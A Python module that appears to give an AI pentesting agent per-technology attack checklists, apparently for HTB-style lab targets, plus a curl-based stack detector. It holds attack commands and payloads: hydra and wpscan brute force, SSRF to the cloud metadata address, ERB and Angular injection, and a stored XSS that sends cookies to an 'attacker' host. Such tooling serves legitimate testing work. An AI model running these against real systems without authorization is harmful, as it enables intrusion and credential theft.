"""
Technology-Specific Security Testing Checklists

Provides targeted test checklists based on detected technologies.
Each technology has known vulnerabilities and misconfigurations to check.
"""

from typing import Dict, List, Optional
from dataclasses import dataclass
from src.sdk.tool import function_tool


@dataclass
class TechTest:
    """A single technology-specific test"""
    name: str
    description: str
    tool: str  # Tool/command to run
    severity: str  # critical, high, medium, low
    cve: Optional[str] = None


# Technology-specific test checklists
TECH_CHECKLISTS: Dict[str, List[TechTest]] = {
    "WordPress": [
        TechTest(
            "User Enumeration",
            "Enumerate users via /wp-json/wp/v2/users",
            "curl https://target.com/wp-json/wp/v2/users",
            "medium"
        ),
        TechTest(
            "xmlrpc.php Exposed",
            "Check for xmlrpc.php (bruteforce, DDoS vector)",
            "curl -X POST https://target.com/xmlrpc.php -d '<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName></methodCall>'",
            "high"
        ),
        TechTest(
            "wp-admin Brute Force",
            "Attempt credential bruteforce",
            "wpscan --url https://target.com --enumerate u --passwords wordlist.txt",
            "critical"
        ),
        TechTest(
            "Plugin/Theme Vulnerabilities",
            "Scan for vulnerable plugins/themes",
            "wpscan --url https://target.com --enumerate vp,vt --api-token TOKEN",
            "high"
        ),
        TechTest(
            "wp-config.php Backup",
            "Check for exposed wp-config.php backups",
            "curl https://target.com/wp-config.php.bak",
            "critical"
        ),
        TechTest(
            "Directory Listing",
            "Check wp-content/uploads for directory listing",
            "curl https://target.com/wp-content/uploads/",
            "low"
        )
    ],
    
    "Laravel": [
        TechTest(
            "Debug Mode Detection",
            "Check for APP_DEBUG=true exposure",
            "curl https://target.com/trigger-error -v",
            "critical",
            "CVE-2021-3129"
        ),
        TechTest(
            ".env File Exposure",
            "Check for exposed .env file",
            "curl https://target.com/.env",
            "critical"
        ),
        TechTest(
            "Telescope Exposure",
            "Check for Laravel Telescope debug tool",
            "curl https://target.com/telescope",
            "high"
        ),
        TechTest(
            "Ignition RCE",
            "Test for Ignition RCE (CVE-2021-3129)",
            "nuclei -u https://target.com -t cves/2021/CVE-2021-3129.yaml",
            "critical",
            "CVE-2021-3129"
        ),
        TechTest(
            "Mass Assignment",
            "Test for mass assignment vulnerabilities",
            "http_fuzz parameter fuzzing on POST endpoints",
            "high"
        )
    ],
    
    "React": [
        TechTest(
            "Source Maps Exposure",
            "Check for .js.map files with source code",
            "curl https://target.com/static/js/main.chunk.js.map",
            "medium"
        ),
        TechTest(
            "API Keys in Bundle",
            "Search bundle.js for hardcoded API keys",
            "curl https://target.com/static/js/main.js | grep -E '(api[_-]?key|secret|token)'",
            "high"
        ),
        TechTest(
            "dangerouslySetInnerHTML XSS",
            "Test for client-side XSS via React props",
            "browser_xss_test with React-specific payloads",
            "high"
        ),
        TechTest(
            "CORS Misconfiguration",
            "Test for overly permissive CORS",
            "cors_check https://target.com",
            "medium"
        ),
        TechTest(
            "NPM Package Vulnerabilities",
            "Check for known vulnerable packages",
            "Analyze package.json dependencies",
            "varies"
        )
    ],
    
    "Angular": [
        TechTest(
            "Client-Side Template Injection",
            "Test for Angular template injection",
            "{{7*7}} or {{constructor.constructor('alert(1)')()}}",
            "high"
        ),
        TechTest(
            "Source Maps",
            "Check for TypeScript source maps",
            "curl https://target.com/main.js.map",
            "medium"
        ),
        TechTest(
            "API Endpoint Discovery",
            "Extract API endpoints from main.js",
            "linkfinder_js https://target.com/main.js",
            "info"
        )
    ],
    
    "GraphQL": [
        TechTest(
            "Introspection Query",
            "Test if introspection is enabled",
            "curl -X POST https://target.com/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}'",
            "medium"
        ),
        TechTest(
            "Query Depth/Cost Limit",
            "Test for DoS via nested queries",
            "Send deeply nested query (50+ levels)",
            "high"
        ),
        TechTest(
            "IDOR via Node IDs",
            "Test for IDOR in GraphQL node/ID queries",
            "Fuzz node IDs in queries",
            "high"
        ),
        TechTest(
            "Authentication Bypass",
            "Test queries without authentication",
            "Send queries without auth headers",
            "critical"
        ),
        TechTest(
            "Field Suggestions",
            "Use field suggestions to discover hidden fields",
            "Query with typos to get suggestions",
            "medium"
        )
    ],
    
    "Django": [
        TechTest(
            "Debug Mode",
            "Check for DEBUG=True in settings",
            "Trigger 404 and check for debug page",
            "critical"
        ),
        TechTest(
            "Admin Panel Discovery",
            "Find Django admin panel",
            "curl https://target.com/admin/",
            "medium"
        ),
        TechTest(
            "Secret Key Exposure",
            "Check for exposed SECRET_KEY",
            "Search in error pages, source code",
            "critical"
        ),
        TechTest(
            "SQL Injection in ORM",
            "Test raw SQL queries",
            "sqli_scanner on query parameters",
            "high"
        )
    ],
    
    "Spring Boot": [
        TechTest(
            "Actuator Endpoints",
            "Check for exposed Spring Actuator",
            "curl https://target.com/actuator",
            "high"
        ),
        TechTest(
            "Heap Dump Download",
            "Download heap dump if exposed",
            "wget https://target.com/actuator/heapdump",
            "critical"
        ),
        TechTest(
            "Environment Variables",
            "Access /actuator/env for secrets",
            "curl https://target.com/actuator/env",
            "critical"
        ),
        TechTest(
            "Spring4Shell",
            "Test for Spring4Shell RCE",
            "nuclei -u https://target.com -t cves/2022/CVE-2022-22965.yaml",
            "critical",
            "CVE-2022-22965"
        )
    ],
    
    "Jenkins": [
        TechTest(
            "Unauthenticated Access",
            "Check if Jenkins requires authentication",
            "curl https://target.com:8080/",
            "critical"
        ),
        TechTest(
            "Script Console",
            "Test for Groovy script console access",
            "curl https://target.com:8080/script",
            "critical"
        ),
        TechTest(
            "Known CVEs",
            "Scan for Jenkins CVEs",
            "nuclei -u https://target.com:8080 -t jenkins",
            "varies"
        )
    ],
    
    "Apache": [
        TechTest(
            "Server-Status Exposure",
            "Check for /server-status",
            "curl https://target.com/server-status",
            "medium"
        ),
        TechTest(
            ".htaccess Bypass",
            "Test .htaccess bypass techniques",
            "Various bypass payloads",
            "high"
        ),
        TechTest(
            "Path Traversal",
            "Test for CVE-2021-41773",
            "nuclei -u https://target.com -t cves/2021/CVE-2021-41773.yaml",
            "critical",
            "CVE-2021-41773"
        )
    ],
    
    "Nginx": [
        TechTest(
            "Off-by-Slash",
            "Test for alias misconfiguration",
            "curl https://target.com/assets../",
            "high"
        ),
        TechTest(
            "Integer Overflow",
            "Test for CVE-2017-7529",
            "Send large range headers",
            "high",
            "CVE-2017-7529"
        )
    ],
    
    "AWS S3": [
        TechTest(
            "Bucket Enumeration",
            "Find S3 buckets",
            "cloud_enum -k target.com",
            "medium"
        ),
        TechTest(
            "Public Read Access",
            "Check if bucket is publicly readable",
            "aws s3 ls s3://bucket-name --no-sign-request",
            "critical"
        ),
        TechTest(
            "Public Write Access",
            "Check if bucket is publicly writable",
            "aws s3 cp test.txt s3://bucket-name/test.txt --no-sign-request",
            "critical"
        )
    ],

    "Ruby on Rails": [
        TechTest(
            "Admin Panel Discovery",
            "Find Rails admin panel (often /admin or /rails/info)",
            "curl http://target/admin  |  curl http://target/rails/info",
            "high"
        ),
        TechTest(
            "Rails Info Page",
            "Check for exposed /rails/info/properties (debug info)",
            "curl http://target/rails/info/properties",
            "critical"
        ),
        TechTest(
            "SSTI / ERB Injection",
            "Test for Server-Side Template Injection in ERB templates",
            "Inject: <%= 7*7 %> or <%= `id` %> in user-controlled fields",
            "critical"
        ),
        TechTest(
            "Mass Assignment",
            "Test for mass assignment via extra POST params",
            "Add admin=true or role=admin to POST body",
            "high"
        ),
        TechTest(
            "Secret Key Base Exposure",
            "Check for exposed SECRET_KEY_BASE in error pages or /rails/info",
            "Trigger error page; look for secret_key_base in debug output",
            "critical"
        ),
        TechTest(
            "IDOR via Predictable IDs",
            "Test sequential integer IDs in resource URLs",
            "Fuzz /users/1, /users/2 etc.; use http_fuzz",
            "high"
        ),
        TechTest(
            "SQL Injection via ActiveRecord",
            "Test query parameters for SQLi (Rails ORM bypasses)",
            "sqlmap -u 'http://target/?id=1' --dbms=postgresql",
            "high"
        ),
        TechTest(
            "Open Redirect",
            "Test redirect_to with user-controlled value",
            "curl 'http://target/login?redirect_url=http://evil.com'",
            "medium"
        ),
    ],

    "Camaleon CMS": [
        TechTest(
            "Admin Login Brute Force",
            "Camaleon admin panel at /admin — brute force credentials",
            "hydra -l admin -P wordlist.txt target http-post-form '/admin/login:username=^USER^&password=^PASS^:Invalid'",
            "critical"
        ),
        TechTest(
            "SSRF via Media Upload (CVE-2024-37489)",
            "Camaleon CMS allows SSRF through the media file upload URL parameter",
            "POST /admin/media/download_remote_file with url=http://169.254.169.254/latest/meta-data/ (or internal URLs)",
            "critical",
            "CVE-2024-37489"
        ),
        TechTest(
            "Stored XSS via Category/Post Title",
            "Inject XSS payload in post titles or category names",
            "Create a post titled: <script>document.location='http://attacker/?c='+document.cookie</script>",
            "high"
        ),
        TechTest(
            "File Upload Bypass",
            "Upload .html/.svg/.js media files to bypass extension whitelist",
            "POST /admin/media with file.svg containing <script>alert(1)</script>",
            "high"
        ),
        TechTest(
            "Privilege Escalation via Role API",
            "Camaleon exposes role management — test for unauthorized role assignment",
            "POST /admin/users/<id>/roles without proper authorization check",
            "high"
        ),
        TechTest(
            "Information Disclosure via /admin/logs",
            "Admin log viewer may expose sensitive paths and credentials",
            "curl http://target/admin/logs",
            "medium"
        ),
        TechTest(
            "Default Credentials",
            "Try default admin:admin or admin:password on /admin",
            "curl -X POST http://target/admin/login -d 'username=admin&password=admin'",
            "critical"
        ),
    ],
}


@function_tool()
def detect_tech_from_response(url: str) -> str:
    """
    Auto-detect the technology stack from HTTP response headers, cookies, and HTML body.
    Call this BEFORE get_tech_checklist to identify the correct technology — never guess.

    Args:
        url: Target URL (e.g. http://10.129.244.96 or http://facts.htb)

    Returns:
        Detected technologies with confidence, plus recommended checklist to use.
    """
    import subprocess
    import re as _re

    # Resolve vhost hostname → IP if not in DNS
    try:
        from src.tools.http_proxy import resolve_vhost as _resolve_vhost
        _fetch_url, _vhost_hdr = _resolve_vhost(url)
    except Exception:
        _fetch_url, _vhost_hdr = url, ""

    _host_args = ["-H", f"Host: {_vhost_hdr}"] if _vhost_hdr else []
    cmd = ["curl", "-s", "-i", "-L", "--max-time", "15", "-A",
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
           *_host_args, _fetch_url]
    try:
        proc = subprocess.run(cmd, capture_output=True, encoding='utf-8', errors='replace', timeout=20)
        resp = proc.stdout
    except Exception as e:
        return f"Error fetching {url}: {e}"

    detected: list[tuple[str, str, str]] = []  # (tech, confidence, evidence)

    # ── Rails / Rack ──────────────────────────────────────────────────────────
    if _re.search(r'x-runtime:\s*\d', resp, _re.I) or _re.search(r'x-request-id:', resp, _re.I):
        detected.append(("Ruby on Rails", "HIGH", "x-runtime / x-request-id headers present"))
    if '_session=' in resp and 'samesite=lax' in resp.lower():
        if not detected or detected[-1][0] != "Ruby on Rails":
            detected.append(("Ruby on Rails", "MEDIUM", "Rails-style session cookie with samesite=lax"))

    # ── Camaleon CMS ──────────────────────────────────────────────────────────
    if 'camaleon' in resp.lower() or 'plugin_front_cache' in resp.lower():
        detected.append(("Camaleon CMS", "HIGH", "'camaleon' or 'plugin_front_cache' in response"))
    if '/assets/themes/camaleon' in resp:
        detected.append(("Camaleon CMS", "HIGH", "Camaleon theme assets path in HTML"))

    # ── WordPress ─────────────────────────────────────────────────────────────
    if 'wp-content' in resp or 'wp-includes' in resp or 'WordPress' in resp:
        detected.append(("WordPress", "HIGH", "wp-content / wp-includes / WordPress string"))
    if _re.search(r'x-generator:\s*WordPress', resp, _re.I):
        detected.append(("WordPress", "HIGH", "X-Generator: WordPress header"))

    # ── Laravel ───────────────────────────────────────────────────────────────
    if 'laravel_session' in resp.lower() or 'laravel' in resp.lower():
        detected.append(("Laravel", "HIGH", "laravel_session cookie or 'laravel' string"))
    if _re.search(r'X-Powered-By:\s*PHP', resp, _re.I) and 'XSRF-TOKEN' in resp:
        detected.append(("Laravel", "MEDIUM", "PHP + XSRF-TOKEN cookie (Laravel default)"))

    # ── Django ────────────────────────────────────────────────────────────────
    if 'csrfmiddlewaretoken' in resp.lower() or 'csrftoken' in resp.lower():
        detected.append(("Django", "HIGH", "csrfmiddlewaretoken / csrftoken cookie"))
    if 'django' in resp.lower():
        detected.append(("Django", "HIGH", "'django' string in response"))

    # ── Spring Boot ───────────────────────────────────────────────────────────
    if 'JSESSIONID' in resp or 'spring' in resp.lower():
        detected.append(("Spring Boot", "MEDIUM", "JSESSIONID cookie or 'spring' string"))
    if _re.search(r'whitelabel error page', resp, _re.I):
        detected.append(("Spring Boot", "HIGH", "Spring Boot Whitelabel Error Page"))

    # ── Express / Node.js ─────────────────────────────────────────────────────
    if _re.search(r'x-powered-by:\s*express', resp, _re.I):
        detected.append(("Node.js/Express", "HIGH", "X-Powered-By: Express header"))

    # ── PHP generic ───────────────────────────────────────────────────────────
    if _re.search(r'x-powered-by:\s*php', resp, _re.I) and not any(d[0] in ("Laravel", "WordPress") for d in detected):
        ver = _re.search(r'x-powered-by:\s*php/(\S+)', resp, _re.I)
        detected.append(("PHP", "HIGH", f"X-Powered-By: PHP/{ver.group(1) if ver else '?'}"))

    # ── Server hints ─────────────────────────────────────────────────────────
    srv = _re.search(r'[Ss]erver:\s*(\S+)', resp)
    server_str = srv.group(1) if srv else "unknown"

    if not detected:
        return (
            f"## Technology Detection: {url}\n"
            f"Server: {server_str}\n"
            f"❌ Could not auto-detect framework from response signatures.\n"
            f"Manual approach: inspect HTML source, JS paths, cookie names, error pages.\n"
            f"DO NOT call get_tech_checklist — no technology was confirmed.\n"
            f"DO NOT assume Camaleon CMS, WordPress, or any other CMS without positive evidence."
        )

    lines_out = [f"## Technology Detection: {url}", f"Server: {server_str}", ""]
    seen = set()
    for tech, conf, evidence in detected:
        if tech not in seen:
            lines_out.append(f"✅ **{tech}** [{conf}] — {evidence}")
            seen.add(tech)

    lines_out.append("")
    lines_out.append("**Recommended checklists to run:**")
    for tech in seen:
        if tech in TECH_CHECKLISTS:
            lines_out.append(f"  → get_tech_checklist('{tech}')")
        else:
            lines_out.append(f"  → No dedicated checklist for {tech} yet")

    return "\n".join(lines_out)


@function_tool()
def get_tech_checklist(technology: str) -> str:
    """
    Get security testing checklist for a specific technology.
    Call detect_tech_from_response first to identify the correct technology.
    
    Args:
        technology: Technology name (e.g., "WordPress", "Camaleon CMS", "Ruby on Rails")
    
    Returns:
        Formatted checklist with tests to perform
    """
    # Case-insensitive lookup
    tech_key = None
    for key in TECH_CHECKLISTS.keys():
        if key.lower() == technology.lower():
            tech_key = key
            break
    
    if not tech_key:
        available = ", ".join(TECH_CHECKLISTS.keys())
        return f"❌ No checklist for '{technology}'\n\nAvailable: {available}"
    
    tests = TECH_CHECKLISTS[tech_key]
    
    result = [f"## 🎯 {tech_key} Security Checklist\n"]
    result.append(f"**Total Tests:** {len(tests)}\n")
    
    # Group by severity
    critical = [t for t in tests if t.severity == "critical"]
    high = [t for t in tests if t.severity == "high"]
    medium = [t for t in tests if t.severity == "medium"]
    low = [t for t in tests if t.severity == "low"]
    
    if critical:
        result.append("### 🔴 CRITICAL")
        for test in critical:
            cve_info = f" ({test.cve})" if test.cve else ""
            result.append(f"\n**{test.name}**{cve_info}")
            result.append(f"- {test.description}")
            result.append(f"- Tool: `{test.tool}`")
    
    if high:
        result.append("\n### 🟠 HIGH")
        for test in high:
            cve_info = f" ({test.cve})" if test.cve else ""
            result.append(f"\n**{test.name}**{cve_info}")
            result.append(f"- {test.description}")
            result.append(f"- Tool: `{test.tool}`")
    
    if medium:
        result.append("\n### 🟡 MEDIUM")
        for test in medium:
            result.append(f"\n**{test.name}**")
            result.append(f"- {test.description}")
            result.append(f"- Tool: `{test.tool}`")
    
    if low:
        result.append("\n### 🟢 LOW")
        for test in low:
            result.append(f"- {test.name}: {test.description}")
    
    return "\n".join(result)


@function_tool()
def list_supported_technologies() -> str:
    """
    List all technologies with security checklists.
    
    Returns:
        List of supported technologies
    """
    result = ["## 🔧 Supported Technology Checklists\n"]
    
    for tech, tests in TECH_CHECKLISTS.items():
        critical_count = len([t for t in tests if t.severity == "critical"])
        high_count = len([t for t in tests if t.severity == "high"])
        
        severity_info = f"({critical_count} critical, {high_count} high)"
        result.append(f"- **{tech}**: {len(tests)} tests {severity_info}")
    
    result.append(f"\n**Total:** {len(TECH_CHECKLISTS)} technologies")
    result.append("\nUse `get_tech_checklist(technology)` to see specific tests")
    
    return "\n".join(result)


def get_tests_for_tech(technology: str) -> List[TechTest]:
    """Get test list for a technology (internal function)"""
    for key in TECH_CHECKLISTS.keys():
        if key.lower() == technology.lower():
            return TECH_CHECKLISTS[key]
    return []
